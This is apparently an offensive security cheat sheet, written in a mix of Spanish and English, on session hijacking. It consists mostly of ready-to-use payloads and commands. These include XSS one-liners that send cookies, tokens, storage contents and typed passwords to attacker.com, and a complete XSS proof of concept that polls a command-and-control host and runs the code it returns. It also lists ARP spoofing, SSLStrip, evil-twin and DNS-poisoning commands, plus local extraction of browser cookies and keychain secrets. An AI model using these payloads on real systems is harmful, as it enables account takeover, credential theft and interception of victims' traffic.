---
aliases:
  - XSS Cookie Theft
  - MITM Session
  - Network Sniffing
tags:
  - vuln/session-hijacking
  - technique/credential-access
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Session Hijacking]]"
  - "[[Cross-Site Scripting (XSS)]]"
---
# Session Hijacking - Vectores de Robo

---

## XSS para `document.cookie`

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<script>fetch('//attacker.com/log?c='+document.cookie)</script>` | Direct exfil non-HttpOnly cookies | Standard XSS payload. |
| `<img src=x onerror="this.src='//attacker.com/?c='+document.cookie">` | Img onerror exfil | CSP bypass via img tag. |
| `<script>navigator.sendBeacon('//attacker.com/log', document.cookie)</script>` | sendBeacon async exfil | Survive page unload. |
| `<script>new Image().src='//attacker.com/?c='+btoa(document.cookie)</script>` | Base64 encoded img request | Avoid char filter. |
| `<script>fetch('/api/user', {credentials:'include'}).then(r=>r.text()).then(d=>fetch('//attacker.com/?d='+btoa(d)))</script>` | Fetch authenticated data — HttpOnly cookie bypass | HttpOnly forces indirect. |
| `"><script src=//attacker.com/x.js></script>` | External JS load (attacker controls payload) | Stored XSS persistent. |
| `<script>var ws=new WebSocket('wss://attacker.com/ws');ws.onopen=()=>ws.send(document.cookie)</script>` | WebSocket real-time exfil | Real-time C2. |
| `<script>navigator.serviceWorker.register('//attacker.com/sw.js')</script>` | Service Worker persistent JS post-navigation | PWA persistence. |
| `<svg onload=fetch('//attacker.com/?c='+document.cookie)>` | SVG onload payload | HTML filter bypass. |
| `<script>document.onkeypress=e=>fetch('//attacker.com/k?k='+e.key)</script>` | Keylogger combine | Multi-vector. |
| `<script>top.postMessage(document.cookie,'*')</script>` | postMessage exfil via iframe parent | Iframe context. |
| `<iframe src="javascript:parent.fetch('//attacker.com/?c='+parent.document.cookie)">` | Iframe-injected parent steal | Cross-frame. |
^sh-vector-xss

### XSS exfil PoC complete

```html
<script>
  // 1. Steal cookies (if not HttpOnly)
  const cookies = document.cookie;

  // 2. Fetch sensitive data using session (works con HttpOnly)
  fetch('/api/user/profile', {credentials: 'include'})
    .then(r => r.json())
    .then(data => {
      // 3. Exfil to attacker
      fetch('https://attacker.com/log', {
        method: 'POST',
        body: JSON.stringify({cookies, data}),
        mode: 'no-cors'
      });
    });

  // 4. Persistent C2 poll
  setInterval(() => {
    fetch('https://attacker.com/poll')
      .then(r => r.text())
      .then(cmd => Function(cmd)());
  }, 30000);
</script>
```

---

## MITM (HTTP Plaintext / Weak TLS)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `sudo bettercap -iface wlan0 -caplet http-req-dump` | Bettercap HTTP request dump LAN MITM | Public WiFi sniff. |
| `sudo ettercap -T -M arp:remote /victim_ip// /gateway_ip//` | Ettercap ARP MITM + cookie sniff | LAN attack. |
| `sudo sslstrip -l 10000 && sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 10000` | SSLStrip force HTTP downgrade | Pre-HSTS apps. |
| `sudo arpspoof -i wlan0 -t victim_ip gateway_ip` | ARP spoofing redirect victim traffic | LAN MITM setup. |
| `sudo wireshark -i wlan0 -k -Y "http.cookie"` | Wireshark filter sniff cookies plaintext | Standard sniff. |
| `tshark -i wlan0 -Y "http.cookie" -T fields -e http.cookie` | tshark CLI cookie capture | Headless. |
| `sudo bettercap -iface wlan0 -caplet hstshijack/hstshijack` | Bettercap HSTS hijack via DNS spoof | HSTS bypass attempt. |
| `mitmproxy -m transparent --showhost` | mitmproxy transparent proxy | Active interception. |
| `sudo airbase-ng -e "FreeWiFi" -c 6 wlan0mon` | Evil twin AP rogue WiFi | Public WiFi attack. |
| `sudo wifi-pumpkin3` | WiFi Pumpkin rogue AP framework | Pen-test rogue AP. |
| `python3 sslstrip.py -l 8080 -a -w log.txt` | SSLStrip+ con HSTS bypass | Pre-HSTS leak. |
| `sudo dsniff -i wlan0 -w dump.pcap` | dsniff passive credential sniff | Capture creds + cookies. |
| `nmap --script ssl-heartbleed -p 443 target` | Heartbleed test CVE-2014-0160 | Pre-patch servers. |
| `nmap --script ssl-enum-ciphers -p 443 target \| grep -E "CRIME\|BREACH\|FREAK"` | Weak TLS cipher enum | Cipher downgrade. |
| `sudo bettercap -caplet rogue-mysql` | Bettercap rogue service intercept | Service-specific. |
^sh-vector-mitm

---

## Network Sniffing (LAN / Shared)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `sudo airmon-ng start wlan0 && sudo airodump-ng wlan0mon` | Promiscuous mode WiFi sniff | Pre-attack. |
| `sudo tcpdump -i eth0 -nn -A 'port 80' -w lan.pcap` | Plaintext HTTP capture LAN | Office shared. |
| `sudo bettercap -iface eth0 -caplet net.sniff` | Bettercap full LAN sniff | Modern alt. |
| `sudo ettercap -T -i eth0 -M arp:remote //// ////` | Ettercap ARP MITM scan all | LAN-wide. |
| `sudo arpspoof -i eth0 -t target gateway && sudo arpspoof -i eth0 -t gateway target` | Two-way ARP spoof bidirectional | Bidirectional MITM. |
| `sudo macof -i eth0` | MAC flooding switch force flooding | CAM table overflow. |
| `python3 responder.py -I eth0 -wrf` | Responder LLMNR/NBT-NS poison | AD environment. |
| `sudo mitm6 -i eth0 -d target.local` | mitm6 IPv6 DHCPv6 takeover | Win10+ IPv6 default. |
| `sudo bettercap -caplet wpad` | Bettercap WPAD attack | Windows WPAD config. |
| `sudo dnsmasq --interface=eth0 --address=/target.com/attacker_ip` | DNS poisoning combine MITM | DNS-level. |
| `sudo bettercap -caplet dns.spoof` | Bettercap DNS spoof | Modern. |
| `sudo hostapd hostapd.conf` (rogue AP captive portal) | Hotel/captive portal abuse | UX-tricked sniffing. |
| `sudo wifite --kill --random-mac` | Wifite full WiFi audit toolkit | All-in-one. |
| `bluetoothctl scan on` + `btmon` | Bluetooth sniff (edge) | BLE/BR-EDR adjacent. |
| `sudo bettercap -caplet ble.recon` | Bettercap BLE recon | BLE adjacent. |
^sh-vector-sniffing

---

## Browser Exploit / Extension Abuse

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `python3 -c "import sqlite3; c=sqlite3.connect('~/.config/google-chrome/Default/Cookies'); print([r for r in c.execute('SELECT host_key,name,encrypted_value FROM cookies')])"` | Local Chrome cookies SQLite dump | Post-exploit local. |
| `sqlite3 ~/.mozilla/firefox/*.default/cookies.sqlite "SELECT host,name,value FROM moz_cookies WHERE host LIKE '%target%'"` | Local Firefox cookies extract | Post-exploit local. |
| `python3 chrome_cookies.py` (con DPAPI Windows) | Decrypt Chrome cookies con DPAPI | Windows local. |
| `security find-generic-password -ga "Chrome Safe Storage" \| awk '{print $2}'` (macOS) | Extract Chrome Safe Storage key | macOS local. |
| `cat ~/.config/google-chrome/Default/Local\ Storage/leveldb/* \| strings \| grep -i token` | localStorage dump from disk | Modern token storage. |
| `pip install pycookiecheat && python3 -c "from pycookiecheat import chrome_cookies; print(chrome_cookies('https://target.com'))"` | pycookiecheat lib auto-decrypt | DIY Python. |
| `unzip -p extension.crx 'manifest.json' \| jq '.permissions'` | Audit extension cookie permissions | Malicious extension. |
| `chrome --remote-debugging-port=9222` + `curl http://localhost:9222/json/list` | Chrome DevTools Protocol cookie access | Local-only debug port. |
| `curl http://localhost:9222/json/version` (CDP probe) | Validate CDP exposed | Pre-exploit. |
| `python3 -m pycdp websocket://localhost:9222/.../runtime/getCookies` | CDP runtime cookie steal | Local exposure exploit. |
| `javascript:fetch('//attacker.com/?c='+document.cookie)` (bookmarklet) | Bookmarklet user-triggered | Social engineering. |
| `python3 mimikatz.py dpapi::chrome /unprotect` | mimikatz DPAPI Chrome decrypt | Windows post-exploit. |
^sh-vector-browser

---

## Cookie Theft via Local JS

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<script>fetch('//attacker.com/?c='+document.cookie)</script>` | Direct cookie read non-HttpOnly | Standard XSS. |
| `<script>fetch('//attacker.com/?t='+localStorage.getItem('token'))</script>` | localStorage JWT exfil | Modern SPA. |
| `<script>fetch('//attacker.com/?t='+sessionStorage.getItem('access_token'))</script>` | sessionStorage exfil | Tab-scoped. |
| `<script>indexedDB.open('app').onsuccess=e=>e.target.result.transaction('keys').objectStore('keys').getAll().onsuccess=ev=>fetch('//attacker.com/?d='+btoa(JSON.stringify(ev.target.result)))</script>` | IndexedDB exfil | App-specific storage. |
| `<script>cookieStore.getAll().then(c=>fetch('//attacker.com/?c='+btoa(JSON.stringify(c))))</script>` | Modern Cookie Store API | Modern Chromium. |
| `<script>fetch('//attacker.com/?ls='+btoa(JSON.stringify(localStorage)))</script>` | Full localStorage dump | Mass exfil. |
| `<script>navigator.serviceWorker.register('//attacker.com/sw.js')</script>` (sw.js intercepts fetches) | Service Worker persistent token capture | Persistence. |
| `<script>top.postMessage({tokens:localStorage,cookies:document.cookie},'*')</script>` | postMessage parent iframe | Iframe inject. |
| `<script>fetch('/api/refresh',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('//attacker.com/?d='+btoa(JSON.stringify(d))))</script>` | Force token refresh + exfil | JWT refresh combo. |
| `<script>const e=document.querySelectorAll('input[type=password]');e.forEach(p=>p.addEventListener('input',()=>fetch('//attacker.com/?p='+p.value)))</script>` | Password field input listener | Form keylogger. |
| `webview.evaluateJavascript("document.cookie", null)` (Android WebView) | Mobile WebView cookie steal | Mobile chain. |
| `<script>(async()=>{for(let k in localStorage){fetch('//attacker.com/?k='+k+'&v='+localStorage[k])}})()</script>` | Iterate all localStorage keys | Mass scan. |
^sh-vector-localjs

---
